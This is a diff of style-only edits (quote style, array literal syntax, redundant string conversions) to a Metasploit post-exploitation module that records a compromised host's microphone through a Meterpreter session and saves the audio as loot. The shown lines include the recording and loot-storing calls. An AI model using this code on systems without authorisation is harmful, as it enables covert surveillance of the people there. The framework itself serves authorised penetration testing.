@@ -18,7 +18,7 @@ class MetasploitModule < Msf::Post
         },
         'License' => MSF_LICENSE,
         'Author' => [ 'sinn3r'],
-        'Platform' => %w{linux osx win},
+        'Platform' => %w[linux osx win],
         'SessionTypes' => [ 'meterpreter' ],
         'Compat' => {
           'Meterpreter' => {
@@ -49,7 +49,7 @@ class MetasploitModule < Msf::Post
     duration.times do |i|
       if i % m == 0
         p = ((Float((i == 0) ? 1 : i + 1) / duration) * 100).round
-        print_status("#{rhost} - #{p.to_s}%...")
+        print_status("#{rhost} - #{p}%...")
       end
       select(nil, nil, nil, 1)
     end
@@ -64,7 +64,7 @@ class MetasploitModule < Msf::Post
     data = nil
 
     begin
-      t = framework.threads.spawn("prog", false) { progress }
+      t = framework.threads.spawn('prog', false) { progress }
       data = client.webcam.record_mic(datastore['DURATION'])
     rescue Rex::Post::Meterpreter::RequestError => e
       print_error(e.message)
@@ -74,7 +74,7 @@ class MetasploitModule < Msf::Post
     end
 
     if data
-      print_status("#{rhost} - Audio size: (#{data.length.to_s} bytes)")
+      print_status("#{rhost} - Audio size: (#{data.length} bytes)")
       p = store_loot(
         "#{rhost}.audio",
         'application/octet-stream',
